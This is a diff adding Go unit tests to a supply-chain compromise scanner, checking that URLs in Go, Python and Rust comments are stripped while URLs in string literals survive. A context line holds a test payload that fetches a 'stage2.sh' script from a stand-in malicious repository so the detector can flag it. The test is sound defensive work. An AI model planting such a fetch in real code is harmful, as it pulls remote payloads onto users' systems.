@@ -2,6 +2,7 @@ package diff //this needs to call unexported grep* functions so the package need
 
 //need to test the engine because otherwise there's no way to knw all of this works without waiting for an in-progress supply chain compromise
 import (
+	"strings"
 	"testing"
 
 	"github.com/grepstrength/grepwatch/alert"
@@ -130,5 +131,51 @@ func TestGrepOutboundURLsFiltersNoise(t *testing.T) {
 	payload := `const x = 1; fetch("https://raw.githubusercontent.com/evil/repo/main/stage2.sh")`
 	if sigs := grepOutboundURLs(old, payload); len(sigs) != 1 || sigs[0].Weight != 4 {
 		t.Errorf("raw payload host should fire at weight 4, got %+v", sigs)
+	}
+}
+//a URL living in a comment needs to be stripped but a URL inside a real string literal needs to survive
+func TestStripCommentsCStyle(t *testing.T) {
+	goSrc := "package main\n" +
+		"// docs at https://evil.example/doc\n" +
+		"var real = \"https://api.service.com/v1\" // trailing note\n"
+
+	stripped := stripComments("main.go", goSrc)
+
+	if strings.Contains(stripped, "evil.example") {
+		t.Errorf("comment URL survived stripping: %q", stripped)
+	}
+	if !strings.Contains(stripped, "api.service.com") {
+		t.Errorf("string-literal URL was wrongly removed: %q", stripped)
+	}
+}
+//a URL inside a Python docstirng must be stripped while a URL in a normal string needs to survive
+func TestStripCommentsPython(t *testing.T) {
+	pySrc := "def f():\n" +
+		"    \"\"\"see https://docs.example/api\"\"\"\n" +
+		"    url = \"https://real.api/v1#frag\"\n"
+
+	stripped := stripComments("mod.py", pySrc)
+
+	if strings.Contains(stripped, "docs.example") {
+		t.Errorf("docstring URL survived stripping: %q", stripped)
+	}
+	if !strings.Contains(stripped, "real.api") {
+		t.Errorf("string URL wrongly removed: %q", stripped)
+	}
+}
+//Rust lifteims ('a) cannot trap the scanner in a fake strnig state
+func TestStripCStyleRustLifetime(t *testing.T) {
+	rustSrc := "fn f<'a>(x: &'a str) -> &'a str {\n" +
+		"    // secret https://evil.example/x\n" +
+		"    x\n" +
+		"}\n"
+
+	stripped := stripComments("lib.rs", rustSrc)
+
+	if strings.Contains(stripped, "evil.example") {
+		t.Errorf("comment after a lifetime survived: %q", stripped)
+	}
+	if !strings.Contains(stripped, "&'a str") {
+		t.Errorf("lifetime code was mangled: %q", stripped)
 	}
 }
